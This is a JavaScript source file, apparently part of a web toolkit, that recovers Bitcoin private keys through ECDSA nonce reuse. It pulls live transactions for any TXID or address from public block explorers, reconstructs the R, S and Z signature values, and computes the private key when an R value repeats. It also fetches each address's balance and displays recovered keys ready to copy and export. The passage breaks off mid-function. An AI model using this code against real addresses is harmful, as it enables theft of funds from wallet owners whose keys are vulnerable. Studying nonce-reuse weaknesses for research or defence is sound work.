/*
 * TXID -> R, S, Z, Address + Private Key Recovery (R-Reuse)
 * Engine extracted from the CryptographyTube Tools collection (tool #1).
 * Self-contained: depends only on CryptoJS (crypto-js) which is loaded
 * before this file. Exposes window.processTxid() and window.exportOne().
 *
 * How it works: given a Bitcoin TXID (or address), it fetches the raw
 * transaction, reconstructs the ECDSA signature components (R, S, Z) for
 * each input, and — if two inputs reuse the same R value with different S —
 * algebraically recovers the private key (nonce-reuse vulnerability).
 */
(function () {
    "use strict";

    // ---- Constants -------------------------------------------------------
    const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
    const N = BigInt('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141');

    const BLOCKCHAIN_API_KEYS = [
        "51c6e11c-1c5c-4c6e-8e8e-8e8e8e8e8e8e",
        "a1b2c3d4-e5f6-4a5b-8c7d-9e0f1a2b3c4d",
        "9e8d7c6b-5a4f-3e2d-1c0b-9a8f7e6d5c4b",
        "f1e2d3c4-b5a6-9d8c-7b6a-5f4e3d2c1b0a",
        "0a1b2c3d-4e5f-6a7b-8c9d-0e1f2a3b4c5d"
    ];

    // ---- Low-level converters -------------------------------------------
    function hexToBytes(hex) {
        if (!hex || typeof hex !== 'string') return new Uint8Array();
        if (hex.length % 2 !== 0) hex = '0' + hex;
        const matches = hex.match(/.{1,2}/g);
        if (!matches) return new Uint8Array();
        return new Uint8Array(matches.map(byte => parseInt(byte, 16)));
    }
    function bytesToHex(bytes) {
        return Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
    }
    function hexToBigInt(hex) { return BigInt('0x' + hex); }

    function reverseHex(hex) {
        if (hex.length % 2 !== 0) throw new Error("Hex string length is odd.");
        return hex.match(/.{1,2}/g).reverse().join('');
    }

    function readVarInt(buf, offset) {
        let prefix = buf[offset];
        if (prefix < 0xFD) return { val: prefix, size: 1 };
        if (prefix === 0xFD) {
            let val = buf[offset + 1] | (buf[offset + 2] << 8);
            return { val: val, size: 3 };
        }
        if (prefix === 0xFE) {
            let val = buf[offset + 1] | (buf[offset + 2] << 8) | (buf[offset + 3] << 16) | (buf[offset + 4] << 24);
            return { val: val, size: 5 };
        }
        return { val: buf[offset + 1], size: 9 };
    }

    // ---- Math ------------------------------------------------------------
    function modInverse(a, m) {
        if (a === 0n) throw new Error("Division by zero (no modular inverse)");
        let m0 = m;
        let x0 = 0n;
        let x1 = 1n;
        a %= m;

        while (a > 1n) {
            if (m === 0n) throw new Error("Modular inverse does not exist");
            let q = a / m;
            let t = m;

            m = a % m;
            a = t;

            t = x0;
            x0 = x1 - q * x0;
            x1 = t;
        }

        if (a === 0n) throw new Error("Modular inverse does not exist");

        if (x1 < 0n) {
            x1 += m0;
        }
        return x1;
    }

    // ---- Hashing (CryptoJS) ---------------------------------------------
    function sha256hex(hex) { return CryptoJS.SHA256(CryptoJS.enc.Hex.parse(hex)).toString(); }
    function ripe160hex(hex) { return CryptoJS.RIPEMD160(CryptoJS.enc.Hex.parse(hex)).toString(); }
    function dblsha256(hex) { return sha256hex(sha256hex(hex)); }

    // ---- Base58 / address ------------------------------------------------
    function b58encode(hex) {
        let num = BigInt("0x" + hex);
        let str = "";
        while (num > 0) {
            str = ALPHABET[Number(num % 58n)] + str;
            num /= 58n;
        }
        for (let i = 0; i < hex.length; i += 2) {
            if (hex.substring(i, i + 2) === "00") str = "1" + str;
            else break;
        }
        return str;
    }

    function hash160ToAddress(hash160, version_byte) {
        const versioned_hash_hex = version_byte + hash160;
        const versioned_hash_bytes = CryptoJS.enc.Hex.parse(versioned_hash_hex);
        const checksum = CryptoJS.SHA256(CryptoJS.SHA256(versioned_hash_bytes)).toString().substring(0, 8);
        return b58encode(versioned_hash_hex + checksum);
    }

    function pubToAddr_P2PKH(pub_hex, version_byte) {
        const pub_bin = hexToBytes(pub_hex);
        const sha256_hash = sha256hex(bytesToHex(pub_bin));
        const ripemd160_hash = ripe160hex(sha256_hash);
        return hash160ToAddress(ripemd160_hash, version_byte || "00");
    }

    // ---- DER signature parsing ------------------------------------------
    function tryParseDerAt(buf, pos) {
        if (!buf || pos + 7 > buf.length) return null;
        try {
            if (buf[pos] !== 0x30) return null; // SEQUENCE (0x30)

            const total_len = buf[pos + 1];
            if (total_len < 6) return null;
            const end = pos + 2 + total_len;
            if (end > buf.length) return null;

            if (buf[pos + 2] !== 0x02) return null; // INTEGER (R-value)

            const r_len = buf[pos + 3];
            const r_start = pos + 4;
            const r_end = r_start + r_len;
            if (r_end >= buf.length || r_end >= end) return null;

            if (buf[r_end] !== 0x02) return null; // INTEGER (S-value)

            const s_len = buf[r_end + 1];
            const s_start = r_end + 2;
            const s_end = s_start + s_len;
            if (s_end > buf.length || s_end > end) return null;

            const r_bytes = buf.slice(r_start, r_end);
            const s_bytes = buf.slice(s_start, s_end);

            let r_hex = bytesToHex(r_bytes);
            let s_hex = bytesToHex(s_bytes);
            if (r_hex.startsWith('00') && r_hex.length > 2) r_hex = r_hex.substring(2);
            if (s_hex.startsWith('00') && s_hex.length > 2) s_hex = s_hex.substring(2);

            const consumed = end - pos;
            return { r: r_hex, s: s_hex, len: consumed };
        } catch (e) {
            return null;
        }
    }

    function parseDER(hex) {
        try {
            if (hex.endsWith("01") || hex.endsWith("81") || hex.endsWith("02") || hex.endsWith("82") || hex.endsWith("03") || hex.endsWith("83")) {
                hex = hex.substring(0, hex.length - 2); // Remove HashType
            }
            let cursor = 0;
            if (hex.substring(cursor, cursor + 2) !== "30") return {}; cursor += 2;
            cursor += 2; // skip total length

            if (hex.substring(cursor, cursor + 2) !== "02") return {}; cursor += 2;
            const rLen = parseInt(hex.substring(cursor, cursor + 2), 16) * 2; cursor += 2;
            let r = hex.substring(cursor, cursor + rLen); cursor += rLen;
            if (r.startsWith("00")) r = r.substring(2);

            if (hex.substring(cursor, cursor + 2) !== "02") return {}; cursor += 2;
            const sLen = parseInt(hex.substring(cursor, cursor + 2), 16) * 2; cursor += 2;
            let s = hex.substring(cursor, cursor + sLen);
            if (s.startsWith("00")) s = s.substring(2);

            return { r, s };
        } catch (e) { return {}; }
    }

    function parseScriptSig(scr) {
        const buf = hexToBytes(scr);
        let r = "", s = "", pub = "";

        // Scan for DER signature (P2PKH standard)
        for (let i = 0; i < buf.length - 10; i++) {
            const maybe = tryParseDerAt(buf, i);
            if (maybe) {
                r = maybe.r;
                s = maybe.s;
                let nextPos = i + maybe.len + 1;
                if (nextPos < buf.length) {
                    let pubPushLen = buf[nextPos];
                    if ((pubPushLen === 33 || pubPushLen === 65) && nextPos + 1 + pubPushLen <= buf.length) {
                        pub = bytesToHex(buf.slice(nextPos + 1, nextPos + 1 + pubPushLen));
                        if (!pub.startsWith("02") && !pub.startsWith("03") && !pub.startsWith("04")) pub = "";
                    }
                }
                if (r && s) break;
            }
        }

        // Fallback search for pubkey if not directly after signature
        if (!pub) {
            for (let i = 0; i < buf.length - 33; i++) {
                let len = buf[i];
                if (len === 33 || len === 65) {
                    let potential = bytesToHex(buf.slice(i + 1, i + 1 + len));
                    if (potential.startsWith("02") || potential.startsWith("03") || potential.startsWith("04")) {
                        pub = potential;
                        break;
                    }
                }
            }
        }

        return { r, s, pub };
    }

    // ---- Transaction parsing --------------------------------------------
    function parseHexTransaction(txRaw) {
        const buf = hexToBytes(txRaw);
        let cursor = 0;

        const version = bytesToHex(buf.slice(cursor, cursor + 4)); cursor += 4;

        let isSegwit = false;
        if (buf[cursor] === 0x00 && buf[cursor + 1] === 0x01) {
            isSegwit = true;
            cursor += 2;
        }

        const inCountData = readVarInt(buf, cursor); cursor += inCountData.size;
        const inputs = [];
        for (let i = 0; i < inCountData.val; i++) {
            const pre_raw = bytesToHex(buf.slice(cursor, cursor + 32));
            const vout_raw = bytesToHex(buf.slice(cursor + 32, cursor + 36));
            cursor += 36;
            const scriptLen = readVarInt(buf, cursor); cursor += scriptLen.size;
            const script_hex = bytesToHex(buf.slice(cursor, cursor + scriptLen.val)); cursor += scriptLen.val;
            const seq_raw = bytesToHex(buf.slice(cursor, cursor + 4)); cursor += 4;
            inputs.push({ pre_raw, vout_raw, script_hex, seq_raw });
        }

        const outCountData = readVarInt(buf, cursor); cursor += outCountData.size;
        const outputs = [];
        for (let i = 0; i < outCountData.val; i++) {
            const value_raw = bytesToHex(buf.slice(cursor, cursor + 8)); cursor += 8;
            const outScriptLen = readVarInt(buf, cursor); cursor += outScriptLen.size;
            const script_hex = bytesToHex(buf.slice(cursor, cursor + outScriptLen.val)); cursor += outScriptLen.val;
            outputs.push({ value_raw, script_len_raw: (outScriptLen.size === 1 ? outScriptLen.val.toString(16).padStart(2, '0') : "fd" + reverseHex(outScriptLen.val.toString(16).padStart(4, '0'))), script_hex });
        }

        if (isSegwit) {
            for (let i = 0; i < inCountData.val; i++) {
                const witnessCount = readVarInt(buf, cursor); cursor += witnessCount.size;
                const witnesses = [];
                for (let j = 0; j < witnessCount.val; j++) {
                    const itemLen = readVarInt(buf, cursor); cursor += itemLen.size;
                    witnesses.push(bytesToHex(buf.slice(cursor, cursor + itemLen.val)));
                    cursor += itemLen.val;
                }
                inputs[i].witness = witnesses;
            }
        }

        const locktime_raw = bytesToHex(buf.slice(cursor, cursor + 4));
        return { version, inputs, outputs, locktime_raw, isSegwit };
    }

    function parsingRaw(rawtx) {
        return parseHexTransaction(rawtx);
    }

    function getrsz_v2(fullTx, inputIndex, scriptPubKey) {
        // Legacy SIGHASH_ALL reconstruction
        let e = fullTx.version;
        let inCount = fullTx.inputs.length;
        let inCountHex = (inCount < 253) ? inCount.toString(16).padStart(2, '0') :
            (inCount < 65536) ? "fd" + reverseHex(inCount.toString(16).padStart(4, '0')) :
                "fe" + reverseHex(inCount.toString(16).padStart(8, '0'));

        e += inCountHex;

        for (let i = 0; i < inCount; i++) {
            const inp = fullTx.inputs[i];
            e += inp.pre_raw;
            e += inp.vout_raw;

            if (i === inputIndex) {
                const spk = scriptPubKey || "";
                const spkLen = (spk.length / 2);
                const spkLenHex = (spkLen < 253) ? spkLen.toString(16).padStart(2, '0') :
                    (spkLen < 65536) ? "fd" + reverseHex(spkLen.toString(16).padStart(4, '0')) :
                        "fe" + reverseHex(spkLen.toString(16).padStart(8, '0'));
                e += spkLenHex + spk;
            } else {
                e += "00";
            }
            e += inp.seq_raw;
        }

        // Outputs
        let outCount = fullTx.outputs.length;
        let outCountHex = (outCount < 253) ? outCount.toString(16).padStart(2, '0') : "fd" + reverseHex(outCount.toString(16).padStart(4, '0'));
        e += outCountHex;
        for (let out of fullTx.outputs) {
            e += out.value_raw + out.script_len_raw + out.script_hex;
        }

        e += fullTx.locktime_raw + "01000000"; // SIGHASH_ALL
        return dblsha256(e);
    }

    function getrsz(parsed, opts) {
        opts = opts || {};
        const version = opts.p2pkhVersion || "00";
        const results = [];
        for (let i = 0; i < parsed.inputs.length; i++) {
            const inp = parsed.inputs[i];
            let r, s, pub;

            // 1. Check Legacy scriptSig
            if (inp.script_hex) {
                const sigData = parseScriptSig(inp.script_hex);
                if (sigData.r) {
                    r = sigData.r; s = sigData.s; pub = sigData.pub;
                }
            }

            // 2. Check Segwit Witness (If no legacy sig found)
            if (!r && inp.witness && inp.witness.length >= 2) {
                // In P2WPKH, Witness is [Signature, PubKey]
                const witnessSig = inp.witness[0];
                const witnessPub = inp.witness[1];
                if (witnessSig && witnessPub) {
                    const der = parseDER(witnessSig);
                    if (der.r) {
                        r = der.r; s = der.s; pub = witnessPub;
                    }
                }
            }

            if (!r || !s || !pub) continue;

            const pubHash160 = ripe160hex(sha256hex(pub));
            const scriptPubKey = "76a914" + pubHash160 + "88ac";
            const addr = pubToAddr_P2PKH(pub, version);

            const z = getrsz_v2(parsed, i, scriptPubKey);

            results.push({
                input_index: i,
                addr: addr,
                r: r,
                s: s,
                z: z,
                pub: pub,
                curve: "secp256k1"
            });
        }
        return results;
    }

    // ---- Network ---------------------------------------------------------
    async function getRawTx(txid) {
        if (!txid || txid.length !== 64) throw new Error("Invalid TXID");

        const urls = [
            `https://blockstream.info/api/tx/${txid}/hex`,
            `https://blockchain.info/rawtx/${txid}?format=hex`
        ];

        for (let url of urls) {
            try {
                const response = await fetch(url, { signal: AbortSignal.timeout(6000) });
                if (response.ok) {
                    const rawtx = await response.text();
                    if (rawtx && rawtx.length > 50 && !rawtx.includes("not found") && !rawtx.startsWith("<!DOCTYPE")) {
                        return rawtx.trim();
                    }
                }
            } catch (e) {
                console.warn(`Fallback: Failed to fetch from ${url}. Trying next...`);
            }
            await new Promise(r => setTimeout(r, 300));
        }

        throw new Error(`API Exhaustion: Could not fetch raw TX ${txid.substring(0, 8)}. Please wait a moment and retry.`);
    }

    // List an address's transaction ids, newest first, up to `want`.
    // Primary: blockstream.info Esplora (CORS-friendly, no API key, 25/page, paged
    // by last-seen txid). Fallback: blockchain.info rawaddr (offset paging).
    // Returns an array of txids, [] if the address genuinely has none, or null if
    // every explorer failed (network / CORS / rate-limit) so the caller can warn.
    async function fetchAddressTxids(addr, want, onProgress) {
        let anyOk = false;

        // --- blockstream.info Esplora (primary) ---
        try {
            let txids = [];
            let lastSeen = '';
            let guard = 0;
            while (txids.length < want && guard < 5000) {
                guard++;
                const url = lastSeen
                    ? `https://blockstream.info/api/address/${addr}/txs/chain/${lastSeen}`
                    : `https://blockstream.info/api/address/${addr}/txs/chain`;
                const resp = await fetch(url, { signal: AbortSignal.timeout(15000) });
                if (!resp.ok) break;
                anyOk = true;
                const arr = await resp.json();
                if (!Array.isArray(arr) || arr.length === 0) break;
                for (const t of arr) txids.push(t.txid);
                lastSeen = arr[arr.length - 1].txid;
                if (onProgress) onProgress({ phase: 'list', listed: txids.length, target: want });
                if (arr.length < 25) break;               // final (short) page
                await new Promise(r => setTimeout(r, 120));
            }
            if (txids.length > 0) return txids.slice(0, want);
            if (anyOk) return [];                          // responded OK but no txs
        } catch (e) { /* fall through to blockchain.info */ }

        // --- blockchain.info rawaddr (fallback) ---
        try {
            let txids = [];
            let total = null;
            let offset = 0;
            const PAGE = 50;                               // rawaddr max per request
            while (txids.length < want) {
                const pageLimit = Math.min(PAGE, want - txids.length);
                const url = `https://blockchain.info/rawaddr/${addr}?limit=${pageLimit}&offset=${offset}&cors=true`;
                const resp = await fetch(url, { signal: AbortSignal.timeout(15000) });
                if (!resp.ok) break;
                anyOk = true;
                const data = await resp.json();
                if (!data || !Array.isArray(data.txs)) break;
                if (total === null) total = data.n_tx || 0;
                if (data.txs.length === 0) break;
                for (const tx of data.txs) txids.push(tx.hash);
                offset += data.txs.length;
                if (onProgress) onProgress({ phase: 'list', listed: txids.length, target: Math.min(want, total || want) });
                if (total && offset >= total) break;
                if (data.txs.length < pageLimit) break;
                await new Promise(r => setTimeout(r, 150));
            }
            if (txids.length > 0) return txids.slice(0, want);
            if (anyOk) return [];
        } catch (e) { /* both sources failed */ }

        return anyOk ? [] : null;
    }

    async function fetchBlockchainData(addr, want, onProgress) {
        want = Math.max(1, parseInt(want, 10) || 100);
        const results = [];

        // 1) Collect exactly `want` tx ids for the address (capped at what exists).
        const txHashes = await fetchAddressTxids(addr, want, onProgress);
        if (txHashes === null) {
            throw new Error("Couldn't reach a block explorer for this address (it may be rate-limiting). Please wait a few seconds and try again, or lower the count.");
        }
        if (txHashes.length === 0) return results;         // address has no transactions

        // 2) For each tx: fetch raw hex, reconstruct R,S,Z, keep the inputs this
        //    address signed. Small concurrent batches + throttle to dodge rate limits.
        const target = txHashes.length;
        let scanned = 0;
        const BATCH = 4;
        for (let b = 0; b < txHashes.length; b += BATCH) {
            const slice = txHashes.slice(b, b + BATCH);
            const settled = await Promise.all(slice.map(async (h) => {
                try {
                    const raw = await getRawTx(h);
                    const parsed = parsingRaw(raw);
                    const matched = getrsz(parsed).filter(it => it.addr === addr);
                    matched.forEach(it => { it.txid = h; });
                    return matched;
                } catch (e) { return []; }
            }));
            settled.forEach(arr => { for (const it of arr) results.push(it); });
            scanned += slice.length;
            if (onProgress) onProgress({ phase: 'scan', scanned: scanned, target: target, found: results.length });
            await new Promise(r => setTimeout(r, 120));
        }
        return results;
    }

    // ---- Address balance / activity stats (same box as Address Analysis) --
    function formatBtc(sats) {
        const n = Number(sats || 0) / 1e8;                 // < 2^53, safe for BTC supply
        const s = n.toFixed(8).replace(/\.?0+$/, '');
        return (s || '0') + ' BTC';
    }

    // Balance / Received / TX for an address. blockstream primary, blockchain.info
    // fallback. Returns {balance, received, tx} (satoshis) or null on total failure.
    async function fetchAddressStats(addr) {
        try {
            const resp = await fetch(`https://blockstream.info/api/address/${addr}`, { signal: AbortSignal.timeout(15000) });
            if (resp.ok) {
                const d = await resp.json();
                const c = d.chain_stats || {};
                const m = d.mempool_stats || {};
                const funded = (c.funded_txo_sum || 0) + (m.funded_txo_sum || 0);
                const spent = (c.spent_txo_sum || 0) + (m.spent_txo_sum || 0);
                const txc = (c.tx_count || 0) + (m.tx_count || 0);
                return { balance: funded - spent, received: funded, tx: txc };
            }
        } catch (e) { /* fall through */ }
        try {
            const resp = await fetch(`https://blockchain.info/rawaddr/${addr}?limit=0&cors=true`, { signal: AbortSignal.timeout(15000) });
            if (resp.ok) {
                const d = await resp.json();
                return { balance: d.final_balance || 0, received: d.total_received || 0, tx: d.n_tx || 0 };
            }
        } catch (e) { /* give up */ }
        return null;
    }

    // Rotating balance-check spinner — the same wheel the Public Key Toolkit /
    // private-keys pages show while an explorer request is in flight. Own class
    // (.txr-spin, not .fa-icon) so the global icon-tint filters never recolour it;
    // it is tinted + spun by tool.css.
    function spinner(size) {
        const n = size || 13;
        return '<img src="../assets/svgs/solid/spinner.svg" class="txr-spin" width="' + n +
            '" height="' + n + '" alt="loading">';
    }
    function setStats(stats) {
        const b = document.getElementById('txr-stat-balance');
        const r = document.getElementById('txr-stat-received');
        const t = document.getElementById('txr-stat-tx');
        // Turn the amount green when the address holds (Balance) or has ever held
        // (Received) coins — matching the private-keys balance colour (#22c55e).
        if (b) { b.textContent = stats ? formatBtc(stats.balance) : '0 BTC'; b.classList.toggle('has-balance', !!(stats && stats.balance > 0)); }
        if (r) { r.textContent = stats ? formatBtc(stats.received) : '0 BTC'; r.classList.toggle('has-balance', !!(stats && stats.received > 0)); }
        if (t) t.textContent = stats ? String(stats.tx) : '0';
    }
    // Show the spinner in the Balance / Received / TX boxes while their lookup runs.
    function statLoading() {
        ['txr-stat-balance', 'txr-stat-received', 'txr-stat-tx'].forEach(function (id) {
            const el = document.getElementById(id);
            if (el) { el.innerHTML = spinner(16); el.classList.remove('has-balance'); }
        });
    }

    async function resolveInputToRSZ(input, want, onProgress) {
        if (!input) return [];
        let inText = input.trim();
        // Detect if Address (roughly 26-62 chars, no colons)
        if (inText.length >= 26 && inText.length <= 62 && !inText.includes(':')) {
            return await fetchBlockchainData(inText, want, onProgress);
        }
        // Assume RSZ Bulk format
        return inText.split('\n').map(l => {
            let p = l.split(':');
            if (p.length >= 3) return { r: p[0].trim(), s: p[1].trim(), z: p[2].trim() };
            return null;
        }).filter(it => it && it.r.length > 50);
    }

    // ---- Key recovery ----------------------------------------------------
    function recover_private_key(R, S1, S2, Z1, Z2) {
        try {
            if (S1 === S2) {
                if (Z1 === Z2) {
                    return "ERROR: Identical Signatures. This is a duplicate broadcast/broadcast collision, NOT a solvable R-reuse exploit (requires different Z values).";
                } else {
                    return "ERROR: Critical Fault. Same S but Different Z implies a fundamental cryptographic failure or non-standard signature model.";
                }
            }

            const R_inv = modInverse(R, N);
            const S_diff = (S1 - S2 + N) % N;
            const S_diff_inv = modInverse(S_diff, N);
            const Z_diff = (Z1 - Z2 + N) % N;
            const k = (Z_diff * S_diff_inv) % N;

            const S1k = (S1 * k) % N;
            const S1k_Z1 = (S1k - Z1 + N) % N;
            const d = (S1k_Z1 * R_inv) % N;

            return d.toString(16).padStart(64, '0');
        } catch (e) {
            return "ERROR: " + e.message;
        }
    }

    // ---- Output header + export (de-branded) -----------------------------
    function getOutputHeader(elementId) {
        let header = `<div class="result-header">CRYPTOGRAPHYTUBE<span class="tool-tag">R &middot; S &middot; Z Analysis</span></div>`;
        if (elementId) {
            header += `
            <div class="download-tools">
                <button class="btn-small btn-txt" title="Export as TXT" onclick="exportOne('${elementId}', 'txt')">
                    <img src="../assets/svgs/solid/download.svg" width="12" height="12" alt=""> SAVE TXT
                </button>
            </div>`;
        }
        return header;
    }

    function exportOne(id, type) {
        const el = document.getElementById(id);
        if (!el || el.innerText.trim() === "" || el.innerText.includes("Waiting for input...") || el.innerText.length < 5) {
            alert("No results to export for this section yet.");
            return;
        }

        const section = el.closest('.tool-section');
        const title = section ? (section.querySelector('h3') ? section.querySelector('h3').innerText : "CryptographyTube Result") : "CryptographyTube Result";
        let rawText = el.innerText || el.textContent;

        let headerText = `CRYPTOGRAPHYTUBE REPORT\n`;
        headerText += `TOOL: ${title.toUpperCase()}\n`;
        headerText += `GENERATED: ${new Date().toLocaleString()}\n`;
        headerText += `--------------------------------------------------\n\n`;

        const fullContent = headerText + rawText;

        if (type === 'txt') {
            const blob = new Blob([fullContent], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `CryptographyTube_Report_${id}.txt`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }
    }

    // ---- HTML helpers ----------------------------------------------------
    function escapeHtml(s) {
        return String(s == null ? '' : s)
            .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
    }

    function copyBtn(text) {
        if (text == null || text === '') return '';
        return '<button type="button" class="rsz-copy" title="Copy" data-copy="' +
            escapeHtml(text) + '"><img src="../assets/svgs/regular/copy.svg" width="12" height="12" alt="copy"></button>';
    }

    // one mono value + copy button (TXID, recovered key, R/S/Z, pubkey…)
    function monoCell(val, extraCls) {
        return '<code class="rsz-val ' + (extraCls || '') + '">' + escapeHtml(val || '—') + '</code>' + copyBtn(val);
    }
    function rszLine(label, val) {
        return '<div class="rsz-line"><span class="rsz-tag">' + label + '</span>' + monoCell(val) + '</div>';
    }
    function addrLine(label, val) {
        return '<div class="rsz-line"><span class="rsz-tag">' + label + '</span>' +
            '<code class="rsz-val rsz-addr-val">' + escapeHtml(val || '—') + '</code>' + copyBtn(val) + '</div>';
    }

    // Delegated copy handler (attached once for the whole page)
    function fallbackCopy(text, done) {
        try {
            const ta = document.createElement('textarea');
            ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
            document.body.appendChild(ta); ta.select();
            document.execCommand('copy'); document.body.removeChild(ta);
            done();
        } catch (e) { /* ignore */ }
    }
    document.addEventListener('click', function (ev) {
        const btn = ev.target && ev.target.closest ? ev.target.closest('.rsz-copy[data-copy]') : null;
        if (!btn) return;
        const val = btn.getAttribute('data-copy');
        const done = function () { btn.classList.add('copied'); setTimeout(function () { btn.classList.remove('copied'); }, 1200); };
        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(val).then(done).catch(function () { fallbackCopy(val, done); });
        } else { fallbackCopy(val, done); }
    });

    // ---- Result rendering (mirrors the site's .keys-table look) ----------
    function renderResults(rsz, input, mode, vulns, adapter) {
        vulns = vulns || [];
        if (!rsz || rsz.length === 0) {
            let empty = '<div class="rsz-status rsz-empty">No signatures found for this ' +
                (mode === 'address' ? 'address' : 'transaction') + '.</div>';
            if (adapter && adapter.note) empty += '<div class="rsz-status" style="margin-top:8px">' + escapeHtml(adapter.note) + '</div>';
            return empty;
        }

        const recovered = vulns.filter(function (v) { return v.pk && !v.error && !v.mismatch; });
        const vulnRows = new Set();
        vulns.forEach(function (v) { vulnRows.add(v.i); vulnRows.add(v.j); });

        let html = '';

        // Summary chips
        html += '<div class="rsz-summary">';
        html += '<span class="rsz-chip">' + rsz.length + ' signature' + (rsz.length > 1 ? 's' : '') + '</span>';
        if (recovered.length) {
            html += '<span class="rsz-chip rsz-chip-danger">R-reuse · ' + recovered.length + ' key' + (recovered.length > 1 ? 's' : '') + ' recovered</span>';
        } else if (vulns.length) {
            html += '<span class="rsz-chip rsz-chip-ok">R-reuse found — key not verifiable</span>';
        } else {
            html += '<span class="rsz-chip rsz-chip-ok">No R-reuse detected</span>';
        }
        html += '</div>';

        // Recovered private key box(es) — only shown when verification did not fail.
        vulns.forEach(function (v) {
            if (v.pk && !v.error && !v.mismatch) {
                const badge = v.verified === true
                    ? '<span style="color:#22c55e;font-weight:600">✓ verified</span>'
                    : (v.verified === null ? '<span style="color:#f59e0b;font-weight:600">unverified</span>' : '');
                html += '<div class="rsz-vuln-box">';
                html += '<div class="rsz-vuln-title"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="15" height="15" alt=""> Private key recovered — R-reuse between input #' +
                    rsz[v.i].input_index + ' and #' + rsz[v.j].input_index + ' ' + badge + '</div>';
                html += '<div class="rsz-vuln-key"><span class="key-label">Private key' + (v.curve === 'ed25519' ? ' (ed25519 scalar)' : '') + '</span>' +
                    '<span class="private-key">' + escapeHtml(v.pk) + '</span>' + copyBtn(v.pk) + '</div>';
                html += '</div>';
            } else if (v.mismatch) {
                html += '<div class="rsz-status">R-reuse detected between input #' + rsz[v.i].input_index + ' and #' + rsz[v.j].input_index +
                    ', but the recovered key failed public-key verification (chain signing-hash not reproduced) — key withheld to avoid showing an incorrect result.</div>';
            } else if (v.error && v.pk) {
                html += '<div class="rsz-error">' + escapeHtml(v.pk) + '</div>';
            }
        });

        // Column header
        html += '<div class="rsz-thead">';
        html += '<div><img src="../assets/svgs/solid/hashtag.svg" width="13" height="13" alt=""> Transaction</div>';
        html += '<div><img src="../assets/svgs/solid/key.svg" width="13" height="13" alt=""> R · S · Z</div>';
        html += '<div><img src="../assets/svgs/solid/wallet.svg" width="13" height="13" alt=""> Address · Public Key</div>';
        html += '</div>';

        // Rows
        for (let idx = 0; idx < rsz.length; idx++) {
            const e = rsz[idx];
            const txid = e.txid || (mode === 'txid' ? input : '');
            const zLabel = (e.curve === 'ed25519') ? 'MSG' : 'Z';
            html += '<div class="rsz-row' + (vulnRows.has(idx) ? ' rsz-row-vuln' : '') + '">';

            html += '<div class="rsz-col rsz-col-txid"><span class="key-label">TXID</span>' +
                monoCell(txid, 'rsz-txid') + '</div>';

            html += '<div class="rsz-col rsz-col-rsz">' +
                rszLine('R', e.r) + rszLine('S', e.s) + rszLine(zLabel, e.z) + '</div>';

            html += '<div class="rsz-col rsz-col-addr">' +
                addrLine('ADDR', e.addr) + addrLine('PUB', e.pub) + '</div>';

            html += '</div>';
        }

        // Ed25519 educational note + per-adapter note.
        if (adapter && adapter.curve === 'ed25519') {
            html += '<div class="rsz-status" style="margin-top:10px">Note: ' + escapeHtml(adapter.symbol || 'This chain') +
                ' uses Ed25519, whose nonce is derived deterministically — so R-reuse (and thus key recovery) essentially never occurs in practice. R and S are shown for every signature; if a reused R is ever found, the key is recovered and verified automatically.</div>';
        }
        if (adapter && adapter.note) html += '<div class="rsz-status" style="margin-top:8px">' + escapeHtml(adapter.note) + '</div>';

        return html;
    }

    // =====================================================================
    //  MULTI-CHAIN ENGINE  (secp256k1 + ed25519 adapters)
    //  Extends the Bitcoin-only tool to 18 chains. The ECDSA recovery math
    //  (recover_private_key) is shared verbatim for every secp256k1 chain;
    //  each adapter only has to produce correct r, s, z from its own tx
    //  format. Ed25519 chains use their own linear recovery. EVERY recovered
    //  key is re-derived to a public key and compared to the on-chain pubkey
    //  before it is shown — a wrong per-chain z can never produce a bogus key.
    // =====================================================================

    // ---- small generic helpers ------------------------------------------
    function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
    function strip0x(h) { return (h == null ? '' : String(h)).replace(/^0x/, ''); }
    function concatBytes() {
        let len = 0, i; for (i = 0; i < arguments.length; i++) len += arguments[i].length;
        const out = new Uint8Array(len); let o = 0;
        for (i = 0; i < arguments.length; i++) { out.set(arguments[i], o); o += arguments[i].length; }
        return out;
    }
    function bytesToBigIntLE(bytes) { let n = 0n; for (let i = bytes.length - 1; i >= 0; i--) n = (n << 8n) | BigInt(bytes[i]); return n; }
    function intToLEHex(n, nbytes) { let v = BigInt(n); let hex = ''; for (let i = 0; i < nbytes; i++) { hex += (Number(v & 0xffn)).toString(16).padStart(2, '0'); v >>= 8n; } return hex; }
    function varIntHex(n) { n = Number(n); if (n < 0xfd) return n.toString(16).padStart(2, '0'); if (n <= 0xffff) return 'fd' + intToLEHex(n, 2); if (n <= 0xffffffff) return 'fe' + intToLEHex(n, 4); return 'ff' + intToLEHex(n, 8); }
    function b64ToBytes(b64) { const bin = atob(b64); const out = new Uint8Array(bin.length); for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i); return out; }
    function readCompactU16(buf, off) { let val = 0, shift = 0, size = 0; for (; ;) { const b = buf[off + size]; val |= (b & 0x7f) << shift; size++; if ((b & 0x80) === 0) break; shift += 7; } return { val: val, size: size }; }
    // integer base units -> decimal string, trailing zeros trimmed, symbol appended
    function formatUnits(v, decimals, symbol) {
        v = (typeof v === 'bigint') ? v : BigInt(v || 0);
        const neg = v < 0n; if (neg) v = -v;
        const base = 10n ** BigInt(decimals);
        const whole = (v / base).toString();
        let frac = (v % base).toString().padStart(decimals, '0').replace(/0+$/, '');
        const num = (neg ? '-' : '') + (frac ? whole + '.' + frac : whole);
        return num + (symbol ? (' ' + symbol) : '');
    }

    // ---- network helpers -------------------------------------------------
    async function getJson(url, timeout, headers) {
        const resp = await fetch(url, { signal: AbortSignal.timeout(timeout || 12000), headers: headers || {} });
        if (!resp.ok) throw new Error('HTTP ' + resp.status);
        return await resp.json();
    }
    async function postJson(url, body, timeout, isGet) {
        const resp = await fetch(url, {
